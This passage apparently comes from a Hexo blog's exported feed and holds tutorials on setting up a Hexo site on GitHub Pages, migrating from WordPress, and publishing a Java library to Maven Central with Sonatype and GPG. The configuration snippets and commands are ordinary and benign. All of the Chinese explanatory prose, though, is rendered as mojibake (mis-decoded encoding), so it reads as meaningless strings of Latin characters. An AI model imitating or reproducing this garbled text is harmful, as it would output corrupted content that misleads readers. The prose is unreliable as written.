<p>ç„¶åï¼Œæˆ‘ä»¬å»é…ç½®åŸŸåçš„cnameè§£æè®°å½•åˆ°ç«™ç‚¹å³å¯ï¼Œè®°å½•å€¼ï¼šLn-guolin.github.ioã€‚</p>
<p>å¦‚æœæ˜¯1çº§åŸŸåï¼Œè¦è§£æ@å’Œwwwä¸¤ä¸ªè®°å½•ï¼Œé…ç½®å®Œæˆåå°±èƒ½é€šè¿‡åŸŸåè®¿é—®å•¦</p>
<p>6ï¼Œå…³é”®æ­¥éª¤ï¼Œé…ç½®å¥½åŸŸåä¹‹åï¼Œæˆ‘ä»¬æ¯æ¬¡hexo deployéƒ½ä¼šå¯¼è‡´github pages settingsçš„domainé…ç½®è¢«æ¸…ç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç«™ç‚¹sourceç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªCNAMEæ–‡ä»¶ï¼Œå†…å®¹ä¸ºä½ çš„åŸŸåå³å¯ã€‚</p>
<h4 id="é…ç½®é¡¶éƒ¨èœå•å’Œå‹é“¾"><a href="#é…ç½®é¡¶éƒ¨èœå•å’Œå‹é“¾" class="headerlink" title="é…ç½®é¡¶éƒ¨èœå•å’Œå‹é“¾"></a>é…ç½®é¡¶éƒ¨èœå•å’Œå‹é“¾</h4><p>1ï¼Œé¡¶éƒ¨èœå•ï¼Œåˆ°ä¸»é¢˜ä¸‹çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹menuå‚æ•°ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  - page: home</span><br><span class="line">    directory: .</span><br><span class="line">    icon: fa-home</span><br><span class="line">  - page: archive</span><br><span class="line">    directory: archives/</span><br><span class="line">    icon: fa-archive</span><br><span class="line">  - page: Utils</span><br><span class="line">    directory: utils/</span><br><span class="line">    icon: fa-wrench</span><br><span class="line">  - page: about</span><br><span class="line">    directory: about/</span><br><span class="line">    icon: fa-user</span><br><span class="line">  - page: rss</span><br><span class="line">    directory: atom.xml</span><br><span class="line">    icon: fa-rss</span><br></pre></td></tr></table></figure>
<p>èœå•çš„å›¾æ ‡</p>
<p>2ï¼Œå‹æƒ…é“¾æ¥ï¼Œåˆ°ä¸»é¢˜ä¸‹çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹linkå‚æ•°ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">links:</span><br><span class="line">  - title: blog.soilove.cn</span><br><span class="line">    url: https://blog.soilove.cn/</span><br><span class="line">  - title: github</span><br><span class="line">    url: https://github.com/Ln-guolin</span><br><span class="line">  - title: dockerhub</span><br><span class="line">    url: https://hub.docker.com/u/guolin123</span><br></pre></td></tr></table></figure>

<h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><h5 id="æ–°å»ºæ–‡ç« å‘å¸ƒ"><a href="#æ–°å»ºæ–‡ç« å‘å¸ƒ" class="headerlink" title="æ–°å»ºæ–‡ç« å‘å¸ƒ"></a>æ–°å»ºæ–‡ç« å‘å¸ƒ</h5><p>1ï¼Œæ–°å»ºæ–‡ç« ï¼Œhexoä¼šç”Ÿæˆä¸€ä¸ª.mdæ–‡ä»¶ï¼Œä½ç½®ï¼šhexo/source/_postsï¼Œåœ¨é‡Œé¢å†™æ–‡ç« å³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new æ–‡ç« </span><br></pre></td></tr></table></figure>
<p>2ï¼Œç”Ÿäº§é™æ€æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>
<p>3ï¼Œå‘å¸ƒæ–‡ç« </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
<h5 id="æ–°å»ºé¡µé¢å‘å¸ƒ"><a href="#æ–°å»ºé¡µé¢å‘å¸ƒ" class="headerlink" title="æ–°å»ºé¡µé¢å‘å¸ƒ"></a>æ–°å»ºé¡µé¢å‘å¸ƒ</h5><p>æ–°å»ºabouté¡µé¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="æ–‡ç« å†…åµŒç½‘é¡µ"><a href="#æ–‡ç« å†…åµŒç½‘é¡µ" class="headerlink" title="æ–‡ç« å†…åµŒç½‘é¡µ"></a>æ–‡ç« å†…åµŒç½‘é¡µ</h5><p>å¸Œæœ›åœ¨æ–‡ç« ä¸­åµŒå…¥ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨iframeæ ‡ç­¾å®ç°ï¼Œå…·ä½“ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://util.soilove.cn/json/&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">800px</span> <span class="attr">frameborder</span>=<span class="string">0</span> <span class="attr">allowfullscreen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="æ–‡ç« å†…åµŒè§†é¢‘"><a href="#æ–‡ç« å†…åµŒè§†é¢‘" class="headerlink" title="æ–‡ç« å†…åµŒè§†é¢‘"></a>æ–‡ç« å†…åµŒè§†é¢‘</h5><p>åœ¨æ–‡ç« ä¸­åµŒå…¥è§†é¢‘ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨iframeæ ‡ç­¾å®ç°ï¼Œè¿™ä¸€åˆ»æ˜¯ä¸æ˜¯è§‰å¾—iframeå¤ªå¥½ç”¨äº†[ç¬‘å“­]ï¼Œå…·ä½“ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/lehuo/hy.mp4&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">600</span> <span class="attr">height</span>=<span class="string">350</span> <span class="attr">frameborder</span>=<span class="string">0</span> <span class="attr">allowfullscreen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="æ–‡ç« å†…åµŒå›¾ç‰‡"><a href="#æ–‡ç« å†…åµŒå›¾ç‰‡" class="headerlink" title="æ–‡ç« å†…åµŒå›¾ç‰‡"></a>æ–‡ç« å†…åµŒå›¾ç‰‡</h5><p>åœ¨æ–‡ç« ä¸­åµŒå…¥å›¾ç‰‡ï¼Œå¸¸ç”¨çš„æœ‰2ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯markdownè‡ªèº«è¯­æ³•æ”¯æŒçš„å†™æ³•ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨imgæ ‡ç­¾ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ã€‚</p>
<p>markdownå›¾ç‰‡æ’å…¥æ–¹æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">![å›¾ç‰‡åç§°](https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/%E9%93%BE%E8%A1%A8.png)</span><br></pre></td></tr></table></figure>
<p>imgæ ‡ç­¾æ’å…¥æ–¹æ³•ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/%E9%93%BE%E8%A1%A8.png&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span> = <span class="string">&quot;300px&quot;</span> <span class="attr">height</span> = <span class="string">&quot;200px&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;å›¾ç‰‡åç§°&quot;</span> <span class="attr">align</span>=<span class="string">left</span> /&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>åšå®¢è®¾ç½®</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»WordPressè¿ç§»åˆ°Hexoå°è®°</title>
    <url>/2020/07/10/blog-wordpress-to-hexo/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å‰æ®µæ—¶é—´ï¼Œç”¨äº†å¥½å‡ å¹´çš„ECSæœåŠ¡å™¨åˆåˆ°äº†ç»­è´¹çš„æ—¶å€™äº†ï¼Œè¯´å·§ä¹ŸæŒºå·§ï¼Œæ­£å€¼é˜¿é‡Œäº‘618å¤§ä¿ƒï¼Œè‡ªå·±åˆæ¢äº†æ‰‹æœºå·ã€‚</p>
<p>æ€»ç®—è¹­ä¸Šäº†ä¸€æ³¢æ–°ç”¨æˆ·ç¦åˆ©ï¼Œæ„Ÿæ¦‚äº†ä¸€ä¸‹è¿™å‡ å¹´ç»­è´¹çš„å¿ƒé…¸ï¼Œæ‰å¿ƒè‚‰ç—›ã€‚</p>
<p>è¶æ­¤å¥‘æœºï¼Œåœ¨è¿ç§»æœåŠ¡å™¨èµ„æºçš„åŒæ—¶ï¼ŒæŠŠwpåšå®¢è¿ç§»åˆ°hexoï¼Œæ”¹ç”¨githubæ¥æ‰˜ç®¡ï¼Œæ¯•ç«Ÿèƒ½å°‘ä¸€å°æœåŠ¡å™¨å°±å°‘ä¸€å°å§ï¼Œä¸æƒ³å†å‰²è‚‰äº†[ç¬‘æ­»]ã€‚</p>
<h4 id="è¿ç§»"><a href="#è¿ç§»" class="headerlink" title="è¿ç§»"></a>è¿ç§»</h4><p>è¿˜è®°å¾—å½“æ—¶æ­åšå®¢å†™æ–‡ç« çš„æ—¶å€™ï¼Œæ‰åˆšæ¯•ä¸šä¸ä¹…ï¼Œåˆç”Ÿç‰›çŠŠï¼Œçœ‹ä»€ä¹ˆéƒ½æ˜¯æ–°é²œçš„ï¼Œè§å•¥å†™å•¥ã€‚å‡ å¹´æ—¶é—´å°±4ã€5ç™¾å¤šç¯‡äº†ï¼Œå‰ä¸¤å¹´åˆæ²¡æ—¶é—´å»å†™ï¼Œ<br>ç°åœ¨çªç„¶ç¿»å‡ºæ¥ä¸€çœ‹ï¼Œå“å“Ÿï¼Œé‚£è´¨é‡ï¼Œè¿˜çœŸæ˜¯ä¸å¿ç›´è§†ï¼Œæƒ¨ä¸å¿ç¹å•Šï¼Œè¿˜æ˜¯è¯¥æ‰”æ‰”å§</p>
<p>1ï¼Œæ–‡ç« å¯¼å‡ºï¼Œç™»å½•wpåšå®¢åå°ï¼Œæ‰¾åˆ°ç™»å½•åå° &gt;&gt; å·¥å…· &gt;&gt; å¯¼å‡ºï¼Œé€‰æ‹©å¯¼å‡ºæ–‡ç« ï¼Œç„¶åç‚¹å‡»â€œä¸‹è½½å¯¼å‡ºçš„æ–‡ä»¶â€ã€‚</p>
<p>2ï¼Œå¯¼å‡ºåä¼šå¾—åˆ°ä¸€ä¸ªxmlæ–‡ä»¶ï¼Œå¦‚ï¼šsoilove.WordPress.2020-07-09.xmlï¼Œæˆ‘ä»¬éœ€è¦åœ¨hexoçš„æœºå™¨ä¸Šå®‰è£…ä¸€ä¸ªæ’ä»¶â€œhexo-migrator-wordpressâ€ï¼Œç”¨æ¥è½¬æ¢xmlä¸­çš„æ–‡ç« </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-migrator-wordpress --save</span><br></pre></td></tr></table></figure>

<p>3ï¼Œä½¿ç”¨æ’ä»¶è½¬æ¢æ–‡ç« ï¼Œç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„â€œ.mdâ€æ–‡ç« æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo migrate /path/soilove.WordPress.2020-07-09.xml</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘å¸ƒjaråˆ°mavenä»“åº“</title>
    <url>/2020/06/16/deploy-jar-to-maven-repository/</url>
    <content><![CDATA[<h3 id="Sonatypeç«™ç‚¹è´¦å·å’Œå·¥å•ç”³è¯·"><a href="#Sonatypeç«™ç‚¹è´¦å·å’Œå·¥å•ç”³è¯·" class="headerlink" title="Sonatypeç«™ç‚¹è´¦å·å’Œå·¥å•ç”³è¯·"></a>Sonatypeç«™ç‚¹è´¦å·å’Œå·¥å•ç”³è¯·</h3><p>1ï¼Œåˆ°sonatype jiraç«™ç‚¹ï¼š<a href="https://issues.sonatype.org/">ç›´è¾¾é“¾æ¥</a>ï¼Œæ³¨å†Œè´¦å·ï¼Œåˆ›å»ºjiraå·¥å•ï¼Œå¡«å†™å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">é¡¹ç›®ï¼šCommunity Support - Open Source Project Repository Hosting</span><br><span class="line">ç±»å‹ï¼šnew project</span><br><span class="line">æ¦‚è¦ï¼šé¡¹ç›®çš„æè¿°</span><br><span class="line">Group Idï¼šé¡¹ç›®çš„groupidï¼Œæœ€å¥½æ˜¯è‡ªå·±çš„åŸŸå</span><br><span class="line">Project Urlï¼šé¡¹ç›®åœ°å€</span><br><span class="line">SCM Urlï¼šé¡¹ç›®Gitåœ°å€</span><br></pre></td></tr></table></figure>
<p>ç„¶æäº¤æˆåŠŸåï¼Œæ³¨æ„å…³æ³¨jiraå·¥å•æˆ–è€…é‚®ç®±ï¼Œå› ä¸ºå·¥ä½œäººå‘˜ä¼šéªŒè¯ä½ å¡«å†™çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯group idåŸŸåçš„æ‰€æœ‰æƒã€‚</p>
<p>2ï¼ŒéªŒè¯åŸŸåæ‰€æœ‰æƒï¼Œéœ€è¦åˆ°åŸŸåæ–°å¢ä¸€ä¸ªä¸jiraå·¥å•å…³è”çš„Txtç±»å‹çš„è§£æè®°å½•ï¼Œé…ç½®ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç±»å‹ï¼štxt</span><br><span class="line">ä¸»æœºè®°å½•ï¼šOSSRH-56616</span><br><span class="line">è®°å½•å€¼ï¼šhttps:&#x2F;&#x2F;issues.sonatype.org&#x2F;browse&#x2F;OSSRH-56616</span><br></pre></td></tr></table></figure>
<p>é…ç½®å®Œæˆåï¼Œåˆ°jiraå·¥å•ä¸‹ç•™è¨€å‘ŠçŸ¥ï¼Œç•™è¨€ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This domain name is mineï¼ŒAnd NDS TXT record has configured</span><br></pre></td></tr></table></figure>
<p>3ï¼ŒåŸŸåéªŒè¯é€šè¿‡åï¼Œä¼šé‚®ä»¶é€šçŸ¥ä½ ç»“æœï¼Œå¹¶å‘ŠçŸ¥ä¸‹ä¸€æ­¥æ“ä½œï¼Œé€šçŸ¥ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cn.soilove has been prepared, now user(s) guolin can:</span><br><span class="line">    * Deploy snapshot artifacts into repositoryÂ https:&#x2F;&#x2F;oss.sonatype.org&#x2F;content&#x2F;repositories&#x2F;snapshots</span><br><span class="line">    * Deploy release artifacts into the staging repositoryÂ https:&#x2F;&#x2F;oss.sonatype.org&#x2F;service&#x2F;local&#x2F;staging&#x2F;deploy&#x2F;maven2</span><br><span class="line">    * Release staged artifacts into repository &#39;Releases&#39;</span><br><span class="line">please comment on this ticket when you promoted your first release, thanks  </span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™ä¸ªæ—¶å€™ï¼Œä½ å·²ç»å‡†å¤‡å¥½deployï¼Œé‚£ä¹ˆå°±ä¿®æ”¹jiraå•çš„ Already Synced to Centralä¸ºyesï¼Œè¡¨æ˜ä½ å·²ç»å‡†å¤‡å¥½åŒæ­¥åˆ°ä¸­å¤®ä»“åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Already Synced to Central = yes </span><br></pre></td></tr></table></figure>
<p>4ï¼Œæœ€åï¼Œç­‰ä½ å°†é¡¹ç›®æ‰“åŒ…å¥½ï¼Œæ¨é€åˆ°ä»“åº“åï¼Œå†æ¬¡åˆ°jiraå·¥å•ç•™è¨€å‘ŠçŸ¥ï¼Œå¼€å¯åŒæ­¥ã€‚ä½ ä¹Ÿå¯ä»¥è´´ä¸Šæ‰“åŒ…å‘å¸ƒæˆåŠŸçš„æ—¥å¿—ï¼Œç•™è¨€ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I have successfully closed and released.</span><br></pre></td></tr></table></figure>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œå·¥ä½œäººå‘˜ä¼šå›å¤å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Central sync is activated for cn.soilove. </span><br><span class="line">After you successfully release, your component will be published to Central, typically within 10 minutes, </span><br><span class="line">though updates to search.maven.org can take up to two hours.</span><br></pre></td></tr></table></figure>
<h3 id="å·¥ç¨‹pomå’Œmavené…ç½®"><a href="#å·¥ç¨‹pomå’Œmavené…ç½®" class="headerlink" title="å·¥ç¨‹pomå’Œmavené…ç½®"></a>å·¥ç¨‹pomå’Œmavené…ç½®</h3><p>1ï¼Œä¿®æ”¹maven settings.xmlæ–‡ä»¶ï¼Œæ–°å¢serveré…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;server&gt;</span><br><span class="line">    &lt;id&gt;ossrh&lt;/id&gt;</span><br><span class="line">    &lt;username&gt;è´¦å·&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;å¯†ç &lt;/password&gt;</span><br><span class="line">&lt;/server&gt;</span><br></pre></td></tr></table></figure>
<p>2ï¼Œä¿®æ”¹å·¥ç¨‹pom.xmlæ–‡ä»¶ï¼Œå¢åŠ å¦‚ä¸‹é…ç½®ï¼Œæ ¹æ®å®é™…å·¥ç¨‹æƒ…å†µä¿®æ”¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.sonatype.oss&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;oss-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;7&lt;/version&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line">&lt;!-- å‘å¸ƒè€…ä¿¡æ¯ --&gt;</span><br><span class="line">&lt;developers&gt;</span><br><span class="line">    &lt;developer&gt;</span><br><span class="line">        &lt;name&gt;guolin&lt;/name&gt;</span><br><span class="line">        &lt;email&gt;root@soilove.cn&lt;/email&gt;</span><br><span class="line">        &lt;url&gt;https://blog.soilove.cn&lt;/url&gt;</span><br><span class="line">    &lt;/developer&gt;</span><br><span class="line">&lt;/developers&gt;</span><br><span class="line">&lt;!--scmä¿¡æ¯--&gt;</span><br><span class="line">&lt;scm&gt;</span><br><span class="line">    &lt;url&gt;https://github.com/Ln-guolin/spring-boot-starter-oss&lt;/url&gt;</span><br><span class="line">&lt;/scm&gt;</span><br><span class="line">&lt;!--licensesä¿¡æ¯ --&gt;</span><br><span class="line">&lt;licenses&gt;</span><br><span class="line">    &lt;license&gt;</span><br><span class="line">        &lt;name&gt;GNU General Public License v3.0&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;http://www.gnu.org/licenses/agpl-3.0.html&lt;/url&gt;</span><br><span class="line">        &lt;distribution&gt;repo&lt;/distribution&gt;</span><br><span class="line">    &lt;/license&gt;</span><br><span class="line">&lt;/licenses&gt;</span><br><span class="line">&lt;!--æ‰“åŒ…é…ç½® --&gt;</span><br><span class="line">&lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.sonatype.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;nexus-staging-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;1.6.3&lt;/version&gt;</span><br><span class="line">                &lt;extensions&gt;<span class="literal">true</span>&lt;/extensions&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;serverId&gt;ossrh&lt;/serverId&gt;</span><br><span class="line">                    &lt;nexusUrl&gt;https://oss.sonatype.org/&lt;/nexusUrl&gt;</span><br><span class="line">                    &lt;autoReleaseAfterClose&gt;<span class="literal">true</span>&lt;/autoReleaseAfterClose&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;<span class="built_in">source</span>&gt;1.8&lt;/<span class="built_in">source</span>&gt;</span><br><span class="line">                    &lt;target&gt;1.8&lt;/target&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-gpg-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;1.6&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;sign-artifacts&lt;/id&gt;</span><br><span class="line">                        &lt;phase&gt;verify&lt;/phase&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;sign&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-javadoc-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;2.10.3&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;attach-javadocs&lt;/id&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;jar&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                        &lt;configuration&gt; &lt;!-- add this to <span class="built_in">disable</span> checking --&gt;</span><br><span class="line">                            &lt;additionalparam&gt;-Xdoclint:none&lt;/additionalparam&gt;</span><br><span class="line">                        &lt;/configuration&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;attach-sources&lt;/id&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;jar-no-fork&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;!--ä»“åº“é…ç½® --&gt;</span><br><span class="line">&lt;distributionManagement&gt;</span><br><span class="line">    &lt;repository&gt;</span><br><span class="line">        &lt;id&gt;ossrh&lt;/id&gt;</span><br><span class="line">        &lt;name&gt;Maven Central Staging Repository&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;https://oss.sonatype.org/service/<span class="built_in">local</span>/staging/deploy/maven2/&lt;/url&gt;</span><br><span class="line">    &lt;/repository&gt;</span><br><span class="line">    &lt;snapshotRepository&gt;</span><br><span class="line">        &lt;id&gt;ossrh&lt;/id&gt;</span><br><span class="line">        &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots&lt;/url&gt;</span><br><span class="line">    &lt;/snapshotRepository&gt;</span><br><span class="line">&lt;/distributionManagement&gt;</span><br></pre></td></tr></table></figure>
<h3 id="æ¨é€jaråˆ°ä¸­å¤®ä»“åº“"><a href="#æ¨é€jaråˆ°ä¸­å¤®ä»“åº“" class="headerlink" title="æ¨é€jaråˆ°ä¸­å¤®ä»“åº“"></a>æ¨é€jaråˆ°ä¸­å¤®ä»“åº“</h3><p>1ï¼Œå®‰è£…gpgï¼Œæˆ‘è¿™é‡Œæ˜¯åŸºäºmacç³»ç»Ÿçš„ï¼Œæ‰€ä»¥ç›´æ¥ç”¨brewå®‰è£…äº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install gpg</span><br></pre></td></tr></table></figure>
<p>2ï¼Œç”Ÿæˆå¯†é’¥å¯¹ï¼Œä¼šæç¤ºè¾“å…¥å§“åã€é‚®ç®±ç­‰å­—æ®µï¼Œå…¶å®ƒç›´æ¥å›è½¦ï¼Œç›´åˆ°è¾“å…¥å¯†ç ç•Œé¢ï¼Œå¯†ç ä¸€å®šè¦è¾“å…¥è®°ç‰¢ï¼Œåé¢æ‰“åŒ…ä¼šè¿›è¡ŒéªŒè¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpg --gen-key</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤æ‰§è¡Œå®Œæˆåï¼Œä¼šè¾“å‡ºå…¬é’¥å’Œç§é’¥ä¿¡æ¯ï¼Œä¸€å®šè¦è®°å½•ä¸‹æ¥ã€‚ä¸‡ä¸€å¿˜è®°äº†å¯ä»¥â€œ<code>gpg --list-keys</code>â€æä¾›å…¬é’¥éƒ¨åˆ†ä¿¡æ¯æŸ¥è¯¢ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg: &#x2F;Users&#x2F;chenguolin&#x2F;.gnupg&#x2F;trustdb.gpgï¼šå»ºç«‹äº†ä¿¡ä»»åº¦æ•°æ®åº“</span><br><span class="line">gpg: å¯†é’¥ C49487317C8BXXXX è¢«æ ‡è®°ä¸ºç»å¯¹ä¿¡ä»»</span><br><span class="line">gpg: ç›®å½•â€˜&#x2F;Users&#x2F;chenguolin&#x2F;.gnupg&#x2F;openpgp-revocs.dâ€™å·²åˆ›å»º</span><br><span class="line">gpg: åŠé”€è¯ä¹¦å·²è¢«å­˜å‚¨ä¸ºâ€˜&#x2F;Users&#x2F;chenguolin&#x2F;.gnupg&#x2F;openpgp-revocs.d&#x2F;E8C38745076F91ADEF800BADC49487317C8BXXXX.revâ€™</span><br><span class="line">å…¬é’¥å’Œç§é’¥å·²ç»ç”Ÿæˆå¹¶è¢«ç­¾åã€‚</span><br><span class="line">pub   rsa2048 2020-04-14 [SC] [æœ‰æ•ˆè‡³ï¼š2022-04-14]</span><br><span class="line">      E8C38745076F91ADEF800BADC49487317C8BXXXX</span><br><span class="line">uid                      chenguolin &lt;root@soilove.cn&gt;</span><br><span class="line">sub   rsa2048 2020-04-14 [E] [æœ‰æ•ˆè‡³ï¼š2022-04-14]</span><br></pre></td></tr></table></figure>

<p>3ï¼Œæ¨é€å…¬é’¥(pub)åˆ°è¿œç¨‹æœåŠ¡ï¼Œå¹¶éªŒè¯æ˜¯å¦æ¨é€å®Œæˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpg --keyserver hkp://keyserver.ubuntu.com:80 --send-keys å…¬é’¥</span><br><span class="line">gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys å…¬é’¥</span><br></pre></td></tr></table></figure>
<p>4ï¼Œæ‰§è¡Œæ‰“åŒ…å‘å¸ƒï¼Œæ³¨æ„ï¼ä¸€å®šè¦åœ¨ç³»ç»Ÿçš„å‘½ä»¤çª—å£æ‰§è¡Œï¼Œideaçš„terminalä¸­æ‰§è¡Œä¼šæŠ¥é”™ï¼Œæ— æ³•å‘¼å‡ºå¯†ç è¾“å…¥çª—å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GPG_TTY=$(tty)</span><br><span class="line">mvn clean deploy</span><br></pre></td></tr></table></figure>
